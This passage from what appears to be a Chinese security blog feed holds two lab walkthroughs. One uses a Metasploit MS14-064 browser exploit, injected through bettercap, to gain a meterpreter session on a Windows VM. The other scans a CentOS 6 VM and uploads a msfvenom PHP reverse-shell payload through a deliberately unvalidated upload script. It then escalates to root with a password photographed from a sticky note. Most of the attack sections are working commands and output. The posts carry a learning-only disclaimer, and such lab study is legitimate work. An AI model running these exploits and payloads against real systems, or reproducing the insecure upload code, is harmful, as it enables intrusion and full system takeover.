<p>然后我们让靶机打开浏览器，打开一个网页&hellip;</p>
<p>IE8 已经不支持 bing 的 https 了，所以一打开就上钩了..</p>
<p></p>
<p></p>
<p>然后我们能做的事情就很多了</p>
<p></p>
<p>我决定使用内个 clippy 的模块，绑定一个 <code>ms14-064</code> 的地址，现在轮到 msf 出场了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>启用模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">use exploit/windows/browser/ms14_064_ole_code_execution
</span></span></code></pre></td></tr></table>
</div>
</div><p>看看模块的描述</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">info 
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Description:</p>
<p>This module exploits the Windows OLE Automation array vulnerability,
CVE-2014-6332. The vulnerability is known to affect Internet
Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
and no patch for Windows XP. However, this exploit will only target
Windows XP and Windows 7 box due to the Powershell limitation.
Windows XP by defaults supports VBS, therefore it is used as the
attack vector. On other newer Windows systems, the exploit will try
using Powershell instead.</p>
</blockquote>
<p>机翻一下就是：</p>
<blockquote>
<p>该模块利用Windows OLE自动化阵列漏洞，CVE-2014-6332。已知该漏洞会影响Windows 95至Windows 10内的Internet Explorer 3.0直到11版本，Windows XP没有补丁。不过，由于Powershell的限制，这个漏洞只会针对Windows XP和Windows 7盒子。Windows XP默认支持VBS，因此它被用作攻击载体。在其他较新的Windows系统上，该漏洞将尝试使用Powershell代替。</p>
</blockquote>
<p>看看设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">show options
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Module options (exploit/windows/browser/ms14_064_ole_code_execution):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name                   Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----                   ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
</span></span><span class="line"><span class="cl">   Retries                true             no        Allow the browser to retry the module
</span></span><span class="line"><span class="cl">   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
</span></span><span class="line"><span class="cl">   SRVPORT                8080             yes       The local port to listen on.
</span></span><span class="line"><span class="cl">   SSL                    false            no        Negotiate SSL for incoming connections
</span></span><span class="line"><span class="cl">   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
</span></span><span class="line"><span class="cl">   TRYUAC                 false            yes       Ask victim to start as Administrator
</span></span><span class="line"><span class="cl">   URIPATH                                 no        The URI to use for this exploit (default is random)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload options (windows/meterpreter/reverse_tcp):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
</span></span><span class="line"><span class="cl">   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
</span></span><span class="line"><span class="cl">   LPORT     4444             yes       The listen port
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   0   Windows XP
</span></span></code></pre></td></tr></table>
</div>
</div><p>一般来讲我们只需要设置一个 <code>SRVHOST</code> 就可以了，但是刚刚 <code>bettercap</code> 把 <code>8080</code> 端口给占用了，因此我们需要重新设置一个 <code>SRVPORT</code>。</p>
<p><code>SRVHOST</code> 设置为攻击机的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVHOST 192.168.101.15
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>SRVPORT</code> 任意指定一个空闲的端口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVPORT 9999
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们得到了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Exploit running as background job 0.
</span></span><span class="line"><span class="cl">[*] Exploit completed, but no session was created.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.101.15:4444 
</span></span><span class="line"><span class="cl">[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
</span></span><span class="line"><span class="cl">[*] Server started.
</span></span></code></pre></td></tr></table>
</div>
</div><p>先把默认的 <code>Clippy image directory</code> 地址改成攻击机的地址，再把这个链接 <code>http://192.168.101.15:9999/deCFhCIwXNHYT</code> 填入 <code>Executable</code> 这一栏里面。</p>
<p></p>
<p>然后点击 <code>Execute</code></p>
<p>这时，靶机就会发生一件有趣的事情</p>
<p></p>
<p>无论点击哪个，都会跳转到 msf 的链接。</p>
<p>点击之后，msf 有了反应</p>
<p></p>
<p>一个 <code>meterpreter</code> 连接建立了</p>
<p></p>
<p>进入这个会话</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sessions -i 1
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>这时我们就可以正常使用 <code>meterpreter</code> 操作这台靶机了..</p>
<p></p>
<p><code>getsystem</code> 提权也没有问题。</p>
<p>至于 <code>meterpreter</code> 的用法就不再继续写下去了，因为之前写过（逃。</p>
<p>然后到这里就算成功一大半了，剩下的就是后渗透，说很久都说不完呢～就到这里吧～</p>
<h2 id="结尾">结尾</h2>
<p>呼~ 写完了.. qwq</p>
<p>不过要声明一下，本文内容仅限于测试学习使用，<strong>别拿去干坏事</strong>，否则后果自负哦～</p>
<p>最后，本站遵循 <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener noreffer">CC-BY-NC 4.0 协议</a>，转载请注明出处</p>
<hr>
<h2 id="参考链接">参考链接</h2>
<ul>
<li><a href="https://cvedetails.com/cve/CVE-2014-6332/" target="_blank" rel="noopener noreffer">CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows</a></li>
<li><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064" target="_blank" rel="noopener noreffer">Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs</a></li>
<li><a href="https://www.exploit-db.com/exploits/35229" target="_blank" rel="noopener noreffer">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/35308" target="_blank" rel="noopener noreffer">Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit</a></li>
<li><a href="http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows" target="_blank" rel="noopener noreffer">IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows</a></li>
<li><a href="https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module" target="_blank" rel="noopener noreffer">CVE-2014-6332: it’s raining shells | forsec</a></li>
<li><a href="https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;gid=1&amp;pid=2" target="_blank" rel="noopener noreffer">kali bettercap的使用 | UsstZt</a></li>
<li><a href="https://blog.csdn.net/qq_33066259/article/details/80737308" target="_blank" rel="noopener noreffer">Bettercap2.6与beef的使用_请你吃橘子-CSDN博客</a></li>
<li><a href="https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead." target="_blank" rel="noopener noreffer">DeepL Translate</a></li>
</ul>
]]></description>
</item><item>
    <title>攻击 CentOS6 虚拟机</title>
    <link>http://weepingdogel.github.io/posts/2020-09-26/</link>
    <pubDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/2020-09-26/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg" referrerpolicy="no-referrer">
            </div><blockquote>
<p>虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。</p>
</blockquote>
<h2 id="序">序</h2>
<p>最近总听到一些声音。</p>
<p>一些关于软件更新的、不同的声音。</p>
<p>一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写</p>
<p>另一边说：持续不断的更新才能带来更好的体验</p>
<p>我不知道哪一边是对的，但有点好奇</p>
<p>我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。</p>
<p>只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。</p>
<h2 id="模拟环境">模拟环境</h2>
<blockquote>
<p>攻击者平台: Arch Linux</p>
<p>IP: 192.168.0.109</p>
<p>受害平台: CentOS 6.1 on VirtualBox</p>
<p>IP: 192.168.0.116</p>
</blockquote>
<p><strong>假如</strong>这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）</p>
<p>我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。</p>
<p>由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。</p>
<p>外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;错误：&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;上传文件名: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件类型: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件大小: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; kB&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件临时存储的位置: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件存储在: &#34;</span> <span class="o">.</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>由于条件有限，只能模拟到这个程度，但我个人认为<del>足以进行抽象测试了</del>(逃</p>
</blockquote>
<h2 id="攻击过程">攻击过程</h2>
<p>总有人喜欢搞破坏，一名黑客对服务器进行了扫描&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O -v 192.168.0.116
</span></span></code></pre></td></tr></table>
</div>
</div><p>结果是这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.116
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 998 closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X|3.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.32 - 3.10
</span></span><span class="line"><span class="cl">Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=261 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
</span></span><span class="line"><span class="cl">           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
</span></span></code></pre></td></tr></table>
</div>
</div><p>他惊讶地发现内核版本居然才 <code>2.6.32</code>，这样的事他还是第一次见。</p>
<p>除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。</p>
<p>他试图访问了网站，在网站上发现了一个文件上传点。</p>
<p></p>
<p>抱着试试看的态度，用 msf 生成了一个 payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.109 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o shell.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
</p>
<p>于是他启动了 <code>msfconsole</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>并使用  <code>exploit/multi/handler</code> 这个模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler 
</span></span></code></pre></td></tr></table>
</div>
</div><p>依次设置好参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.109
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LPORT 4444
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后一步就是运行模块了，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后 msf 开始监听。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span></code></pre></td></tr></table>
</div>
</div><p>这时他将提示出的文件地址和链接改一下，并访问</p>
<blockquote>
<p><code>http://192.168.0.116/upload/shell.php</code></p>
</blockquote>
<p>msf 立刻就有了结果，可想而知，服务器的安全措施有多差</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span><span class="line"><span class="cl">[*] Sending stage (38288 bytes) to 192.168.0.116
</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.0.109:4444 -&gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>现在他开始获取系统简要信息</p>
<ul>
<li>系统、内核版本</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer    : localhost
</span></span><span class="line"><span class="cl">OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
</span></span><span class="line"><span class="cl">Meterpreter : php/linux
</span></span><span class="line"><span class="cl">meterpreter &gt; cat /etc/issue
</span></span><span class="line"><span class="cl">CentOS release 6.10 (Final)
</span></span><span class="line"><span class="cl">Kernel \r on an \m
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>当前控制的用户权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span><span class="line"><span class="cl">Server username: apache (48)
</span></span></code></pre></td></tr></table>
</div>
</div><p>权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。</p>
<p>由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。</p>
<p>看起来他需要想想其他办法。</p>
<p>他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。</p>
<p>一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。</p>
<p>上面写着一些数字和字母，也许是什么有用的东西。</p>
<p>趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。</p>
<p>比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。</p>
<p>下班后回到终端，尝试着用偷窥来的密码直接登陆 root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span><span class="line"><span class="cl">Process 1376 created.
</span></span><span class="line"><span class="cl">Channel 2 created.
</span></span></code></pre></td></tr></table>
</div>
</div><p>获得交互 shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/bin/sh -i
</span></span><span class="line"><span class="cl">sh: no job control in this shell
</span></span><span class="line"><span class="cl">sh-4.1$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>进行登录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">bash-4.1$ su root
</span></span><span class="line"><span class="cl">su root
</span></span><span class="line"><span class="cl">Password: ************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见，一口气便登录成功，root 权限到了他的手里。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">[root@localhost upload]# id
